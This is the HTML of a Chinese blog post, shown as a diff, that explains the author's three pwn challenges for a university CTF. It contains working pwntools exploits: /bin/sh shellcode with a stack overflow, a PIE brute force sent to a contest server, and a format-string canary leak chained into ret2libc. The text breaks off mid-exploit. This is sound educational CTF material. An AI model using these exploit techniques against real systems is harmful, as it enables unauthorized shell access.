@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第二届校赛pwn题wp | 无敌马b</title><meta name="author" content="无敌马b"><meta name="copyright" content="无敌马b"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PWN这次校赛由我负责出pwn部分题目，也都挺简单的。GGKING’s gift本题是shellcode签到题，大致思路是在栈上写shellcode然后栈溢出返回到shellcode即可 来看具体wp 首先就是看保护  nx保护没开，看看是不是shellcode 首先看main函数  是GGKING把nx保护关了，感谢GGKING，我们发现程序把code设置成了可执行，所以就可以用shellcod">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二届校赛pwn题wp">
+<meta property="og:url" content="http://example.com/2025/04/20/pwn_wp1/index.html">
+<meta property="og:site_name" content="无敌马b">
+<meta property="og:description" content="PWN这次校赛由我负责出pwn部分题目，也都挺简单的。GGKING’s gift本题是shellcode签到题，大致思路是在栈上写shellcode然后栈溢出返回到shellcode即可 来看具体wp 首先就是看保护  nx保护没开，看看是不是shellcode 首先看main函数  是GGKING把nx保护关了，感谢GGKING，我们发现程序把code设置成了可执行，所以就可以用shellcod">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/touxaing1.jpg">
+<meta property="article:published_time" content="2025-04-20T14:09:58.629Z">
+<meta property="article:modified_time" content="2025-04-20T14:16:55.415Z">
+<meta property="article:author" content="无敌马b">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/touxaing1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "第二届校赛pwn题wp",
+  "url": "http://example.com/2025/04/20/pwn_wp1/",
+  "image": "https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/touxaing1.jpg",
+  "datePublished": "2025-04-20T14:09:58.629Z",
+  "dateModified": "2025-04-20T14:16:55.415Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "无敌马b",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/touxaing1.jpg"><link rel="canonical" href="http://example.com/2025/04/20/pwn_wp1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '第二届校赛pwn题wp',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/202503162230551.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/touxaing1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 档案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/beijing1.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/touxaing1.jpg" alt="Logo"><span class="site-name">无敌马b</span></a><a class="nav-page-title" href="/"><span class="site-name">第二届校赛pwn题wp</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 档案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">第二届校赛pwn题wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-20T14:09:58.629Z" title="发表于 2025-04-20 22:09:58">2025-04-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-20T14:16:55.415Z" title="更新于 2025-04-20 22:16:55">2025-04-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="这次校赛由我负责出pwn部分题目，也都挺简单的。"><a href="#这次校赛由我负责出pwn部分题目，也都挺简单的。" class="headerlink" title="这次校赛由我负责出pwn部分题目，也都挺简单的。"></a>这次校赛由我负责出pwn部分题目，也都挺简单的。</h2><h3 id="GGKING’s-gift"><a href="#GGKING’s-gift" class="headerlink" title="GGKING’s gift"></a>GGKING’s gift</h3><p>本题是shellcode签到题，大致思路是在栈上写shellcode然后栈溢出返回到shellcode即可</p>
+<p>来看具体wp</p>
+<p>首先就是看保护</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407213950074.png" alt="image-20250407213950074"></p>
+<p>nx保护没开，看看是不是shellcode</p>
+<p>首先看main函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407214241814.png" alt="image-20250407214241814"></p>
+<p>是GGKING把nx保护关了，感谢GGKING，我们发现程序把code设置成了可执行，所以就可以用shellcode</p>
+<p>我们可以输入0x17的字节到code里，我们看看code是在哪里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407214713518.png" alt="image-20250407214713518"></p>
+<p>我们在看看vuln是啥</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407215118312.png" alt="image-20250407215118312"></p>
+<p>我们发现可以输入0x100字节，所以可以溢出到返回地址，将返回地址设置到code处就可以执行shellcode了</p>
+<p>注意这里我们只能输入0x17个字节的shellcode，所以pwntools自带的那个shellcode过大输入不进去可以百度下找找短点的shellcode</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;10.26.229.52&#x27;,32814)</span></span><br><span class="line">bss=<span class="number">0x404080</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;GGKING&#x27;s heart?\n&quot;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>)+ p64(bss)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;why baby why?\n&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407220059750.png" alt="image-20250407220059750"></p>
+<p>成功获得shell</p>
+<h3 id="热天text-pro"><a href="#热天text-pro" class="headerlink" title="热天text pro"></a>热天text pro</h3><p>上次新生赛出了这个ret2text，这里加个保护继续拿来用 大概思路是pie爆破</p>
+<p>先看看保护</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407220157639.png" alt="image-20250407220157639"></p>
+<p>相比上次多开了pie</p>
+<p>看看main函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407220305629.png" alt="image-20250407220305629"></p>
+<p>哇 是欢迎界面</p>
+<p>点开vuln看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407220420897.png" alt="image-20250407220420897"></p>
+<p>哇 是最喜欢的栈溢出</p>
+<p>发现旁边还有个func函数看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407220618758.png" alt="image-20250407220618758"></p>
+<p>哇 是最喜欢的system</p>
+<p>点开shell看看是啥</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407220657488.png" alt="image-20250407220657488"></p>
+<p>哇 是最喜欢的pwn帝mowen</p>
+<p>总体题目和上次一样 可以看到mowen是pwn帝 可以联系他的qq来获得flag 但真的重要的是后面的&#x2F;bin&#x2F;sh,看到&#x2F;bin&#x2F;sh前面有分号 这样在执行函数时前面一团乱的就不用管 真正执行的是system(&#x2F;bin&#x2F;sh)所以后门函数确定是这个 再看看这个后门函数地址在哪</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407220919141.png" alt="image-20250407220919141"></p>
+<p>找到了0x1294</p>
+<p>那是不是直接栈溢出返回地址到这里就好了吗，错误的，我们前面看到了此题开了pie保护，那pie是啥呢百度一下你就知道</p>
+<p>简单来说程序开启了 pie 保护，我们无法完全确定程序的地址 但是由于内存分页机制，程序地址最后 3个 16进制位是不会改变的 linux 下一个内存页为 0x1000 即（4KB） 所以是我们后三个16位进制是不会变的</p>
+<p>我们动调看看返回地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407221627751.png" alt="image-20250407221627751"></p>
+<p>是0x555555555334</p>
+<p>我们再看看func函数地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407221834137.png" alt="image-20250407221834137"></p>
+<p>是0x555555555273，后面三位是不同的，可惜了，如果只是最后两位不同那我们直接覆盖最后一个字节就行了，但是这里是三位不同那我们是要覆盖两个字节，但是倒数第4位是不确定的，所以我们不知道应该输入什么，（1273或者2273或者3273都有可能）这时候就需要爆破了，写个爆破脚本即可，注意接收</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf</span>):</span><br><span class="line">    <span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&#x27;10.26.229.52&#x27;</span>,<span class="number">32817</span>)</span><br><span class="line">    r = i &lt;&lt; <span class="number">0xc</span></span><br><span class="line">    pay = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x88</span> + p16(r + <span class="number">0x294</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;shell\n&#x27;</span>)</span><br><span class="line">    p.send(pay)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        flag = p.recv()</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可能打一次没出，一次不够那就再来次</p>
+<p>得到flag，”mowen找不到flag”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407232017098.png" alt="image-20250407232017098"></p>
+<h3 id="她不见了"><a href="#她不见了" class="headerlink" title="她不见了"></a>她不见了</h3><p>照例看看保护</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407223056885.png" alt="image-20250407223056885"></p>
+<p>开启了Canary和NX保护。</p>
+<p>看看第一个函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407223326792.png" alt="image-20250407223326792"></p>
+<p>是个输入然后用printf输出，没有溢出 可以联想到格式化字符串漏洞 由于开了canary保护，可以想到用printf泄露出来</p>
+<p>那么canary是啥呢百度一下你就知道</p>
+<p>简单来说就是防止缓冲区溢出 你栈溢出时候要保证canary没变，不然就会报错</p>
+<p>那么格式化字符串漏洞又是啥呢百度一下你就知道</p>
+<p>通过printf我们就可以利用</p>
+<p>在程序中我们发现居然没有后门函数，这我要咋获得shell啊（可以通过ret2libc）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407224353798.png"></p>
+<p>这里有喜欢的栈溢出</p>
+<p>所以具体思路是利用secret()函数中的格式化字符串漏洞泄露Canary的地址，从而泄露出Canary的值；</p>
+<p>利用SetString()函数泄露puts()函数的实际地址，进而计算libc基址、system()函数和&#x2F;bin&#x2F;sh字符串的地址；</p>
+<p>构造栈结构，利用栈溢出来进行ret2libc攻击；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407224714743.png" alt="image-20250407224714743"></p>
+<p>这里知道canary位于rbp-0x8位置 所以到时候覆盖到这里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407225054390.png" alt="image-20250407225054390"></p>
+<p>通过打印输出的内容，从左到右数，可以知道格式化字符串的偏移量为6 这里如果不太清楚可以去百度搜索格式化字符串漏洞学习下</p>
+<p>动调输入看看 断点断到printf</p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407225314740.png" alt="image-20250407225314740"></p>
+<p>所以其实canary的偏移是39,用’%39$p’打印出来然后接收</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;10.26.229.52&#x27;,32819)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%39$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;canary &gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">p.interactive</span><br></pre></td></tr></table></figure>
+
+<p>接下来，利用<code>SetString()</code>函数泄露<code>puts()</code>函数的实际地址，进而计算<code>libc基址</code>。</p>
+<p>由于是64位程序，所以需要rdi寄存器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407230100776.png" alt="image-20250407230100776"></p>
+<p>第一段payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;10.26.229.52&#x27;</span>,<span class="number">32819</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%39$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;canary &gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi =<span class="number">0x400953</span> </span><br><span class="line">SetString_addr = <span class="number">0x40082A</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(SetString_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lose her\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;puts_addr &gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>但是请注意不要在本地打，因为我给你们的文件的libc和远程不一样，题目中我也提醒了以远程为主，所以我们是远程看puts的后三位</p>
+<p>查询对应的libc库  <a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407230838619.png" alt="image-20250407230838619"></p>
+<p>看到是以0x6a0结尾 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/edsdes/ImageBed/img/image-20250407231022899.png" alt="image-20250407231022899"></p>
+<p>可以下载或者直接使用偏移</p>
+<p>下载的话可以直接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>再和前面一样栈溢出即可</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;10.26.229.52&#x27;</span>,<span class="number">32825</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%39$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;canary &gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi =<span class="number">0x400953</span> </span><br><span class="line">SetString_addr = <span class="number">0x40082A</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(SetString_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lose her\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;puts_addr &gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lose her&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"><span class="comment">#payload += 